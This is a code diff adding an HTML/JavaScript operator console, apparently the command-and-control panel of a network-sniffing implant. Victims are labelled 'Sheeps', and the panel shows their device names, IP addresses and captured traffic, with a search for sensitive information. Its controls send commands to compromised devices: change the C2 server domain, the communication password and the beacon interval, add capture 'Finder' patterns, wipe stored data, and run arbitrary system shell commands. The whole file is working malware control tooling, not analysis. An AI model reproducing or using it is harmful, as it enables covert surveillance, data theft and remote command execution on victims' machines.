@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>Diana Console</title>
+  <link rel="stylesheet" href="https://cdn.90so.net/layui/2.4.5/css/layui.css">
+</head>
+<body class="layui-layout-body">
+ 
+<div class="layui-layout">
+    <div class="layui-nav layui-bg-cyan">
+        <h1>Diana Console</h1>
+        <br>
+    </div>
+    <br>
+    <div class="layui-row">
+        <div class="layui-col-md7">
+            <table id="sheep">
+              <div class="layui-row">
+              <h2 class="layui-inline layui-col-md6">Sheeps</h2>
+              敏感信息搜索：
+              <div class="layui-inline"><input class="layui-input" name="id" id="sheep_info_key" autocomplete="off"></div>
+              <button class="layui-btn layui-btn-normal" data-type="reload">搜索</button>
+              </div>
+            </table>
+        </div>
+        <div class="layui-col-md5">
+            <div class="layui-row">
+                <table id="command_table">
+                  <div class="layui-row">
+                  <h2 class="layui-inline layui-col-md4">Commands</h2>
+                  命令内容搜索:
+                  <div class="layui-inline"><input class="layui-input" name="id" id="command_key" autocomplete="off"></div>
+                  <button class="layui-btn layui-btn-normal" data-type="reload">搜索</button>
+                  </div>
+                </table>
+            </div>
+            <div class="layui-row">
+              <div class="layui-row">
+                <div class="layui-col-md2">
+                  <div class="layui-row">
+                  <div class="layui-col-md6 layui-inline"><input class="layui-input" id="set_interval" autocomplete="off"></div><div class="layui-col-md1"><button class="layui-btn" id="set_interval_btn">设置interval</button></div>
+                  </div>
+                </div>
+                <div class="layui-col-md1">&nbsp;</div>
+                <div class="layui-col-md4">
+                  <div class="layui-row">
+                    <div class="layui-col-md5 layui-inline">
+                      <input class="layui-input" id="set_device_name" autocomplete="off">
+                    </div>
+
+                    <div class="layui-col-md1"><button class="layui-btn" id="set_device_name_btn">设置设备名称</button></div>
+                  </div>
+                </div>
+                <div class="layui-col-md4">
+                  <div class="layui-row">
+                    <div class="layui-col-md8 layui-inline">
+                      <input class="layui-input" id="set_password" autocomplete="off">
+                    </div>
+
+                    <div class="layui-col-md1"><button class="layui-btn" id="set_password_btn">设置通信密码</button></div>
+                  </div>
+                </div>
+              </div>
+              <br>
+              <div class="layui-row">
+                <div class="layui-col-md8"><input class="layui-input" id="set_host"></div>
+                <div class="layui-col-md1">&nbsp;</div>
+                
+                <div class="layui-col-md1"><button class="layui-btn" id="set_host_btn">设置C2服务器域名</button></div>
+              </div>
+              <br>
+              <div class="layui-row">
+                <div class="layui-col-md8"><input class="layui-input" id="add_finder_btn"></div>
+                <div class="layui-col-md1">&nbsp;</div>
+                <div class="layui-col-md1"><button class="layui-btn" id="add_finder">添加Finder</button></div>
+              </div>
+              <br>
+              <div class="layui-row">
+                <div class="layui-col-md2"><button class="layui-btn" id="clear_btn">清空数据</button></div>
+                <div class="layui-col-md2"><button class="layui-btn" id="reset_finder_btn">重置finder</button></div>
+                <div class="layui-col-md5"><input class="layui-input layui-inline" id="system"></div>
+                <div class="layui-col-md1"><button class="layui-btn" id="system_btn">执行命令</button></div>
+              </div>
+            </div>
+        </div>
+    </div>
+</div>
+ 
+<script src="https://cdn.90so.net/layui/2.4.5/layui.js"></script>
+<script>
+</script>
+<script>
+layui.use(['layer', 'form', 'table','element'], function(){
+  var layer = layui.layer
+  ,form = layui.form
+  ,table = layui.table
+  ,element = layui.element;
+  
+
+  table.render({
+    elem: '#sheep'
+    ,height: 900
+    ,url: '/Wall'
+    ,method: 'post'
+    ,id: 'sheep_table'
+    ,page: false
+    ,cols: [[
+      {field: 'id', title: 'ID', width:40, sort: true, fixed: 'left'}
+      ,{field: 'time', title: '时间', width: 160, sort: true}
+      ,{field: 'device', title: '设备名称', width:105}
+      ,{field: 'from', title: '源ip地址', width:140}
+      ,{field: 'to', title: '目的ip地址', width:140} 
+      ,{field: 'info', title: '抓取内容', width:255}
+    ]]
+  });
+  table.render({
+    elem: '#command_table'
+    ,height: 450
+    ,url: '/Commands'
+    ,method: 'get'
+    ,id: 'commmand_table'
+    ,page: false
+    ,cols: [[
+      {field: 'id', title: 'ID', width:80, sort: true, fixed: 'left'}
+      ,{field: 'command', title: '指令', width: 200}
+      ,{field: 'param', title: '参数', width:200}
+      ,{field: 'status', title: '状态', width:140, sort: true}
+    ]]
+  });
+  var $ = layui.$, active = {
+    reload: function(){
+      var sheep_info_key = $('#sheep_info_key');
+      
+      //执行重载
+      table.reload('sheep_table', {
+        page: {
+          curr: 1 //重新从第 1 页开始
+        }
+        ,where: {
+          key: {
+            id: sheep_info_key.val()
+          }
+        }
+      });
+      var command_key = $('#command_key')
+      table.reload('command_table', {
+        page: {
+          curr: 1 //重新从第 1 页开始
+        }
+        ,where: {
+          key: {
+            id: command_key.val()
+          }
+        }
+      });
+    }
+  };
+  
+  $('.sheep .layui-btn').on('click', function(){
+    var type = $(this).data('type');
+    active[type] ? active[type].call(this) : '';
+  });
+  $('.command .layui-btn').on('click', function(){
+    var type = $(this).data('type');
+    active[type] ? active[type].call(this) : '';
+  });
+  
+  $("#set_interval_btn").on('click',function(){
+    var arg = $("#set_interval")
+    if (arg.val()==""){
+      layer.msg("请输入命令参数");
+      return;
+    }
+    $.post("/Commands",{"command":"interval","param":arg.val()},function(){
+      layer.msg("命令发送成功，正在等待执行~");
+    });
+  });
+  $("#set_device_name_btn").on('click',function(){
+    var arg = $("#set_device_name")
+    if (arg.val()==""){
+      layer.msg("请输入命令参数");
+      return;
+    }
+    $.post("/Commands",{"command":"device_name","param":arg.val()},function(){
+      layer.msg("命令发送成功，正在等待执行~");
+    });
+  });
+  $("#set_password_btn").on('click',function(){
+    var arg = $("#set_password")
+    if (arg.val()==""){
+      layer.msg("请输入命令参数");
+      return;
+    }
+    $.post("/Commands",{"command":"password","param":arg.val()},function(){
+      layer.msg("命令发送成功，正在等待执行~");
+    });
+  });
+  $("#set_host_btn").on('click',function(){
+    var arg = $("#set_host")
+    if (arg.val()==""){
+      layer.msg("请输入命令参数");
+      return;
+    }
+    $.post("/Commands",{"command":"host","param":arg.val()},function(){
+      layer.msg("命令发送成功，正在等待执行~");
+    });
+  });
+  $("#add_finder_btn").on('click',function(){
+    var arg = $("#add_finder")
+    if (arg.val()==""){
+      layer.msg("请输入命令参数");
+      return;
+    }
+    $.post("/Commands",{"command":"add_finder","param":arg.val()},function(){
+      layer.msg("命令发送成功，正在等待执行~");
+    });
+  });
+  $("#clear_btn").on('click',function(){
+    $.get("/Clear",function(){
+      layer.msg("已清空所储存数据");
+    });
+  });
+  $("#reset_finder_btn").on('click',function(){
+    $.post("/Commands",{"command":"reset_finder","param":"1"},function(){
+      layer.msg("已发送重置finder指令，等待执行");
+    });
+  });
+  $("#system_btn").on('click',function(){
+    var arg = $("#system")
+    if (arg.val()==""){
+      layer.msg("请输入命令参数");
+      return;
+    }
+    $.post("/Commands",{"command":"system","param":arg.val()},function(){
+      layer.msg("命令发送成功，正在等待执行~");
+    });
+  });
+  // layer.msg('加载完毕');
+});
+
+</script> 
+</body>
+</html>
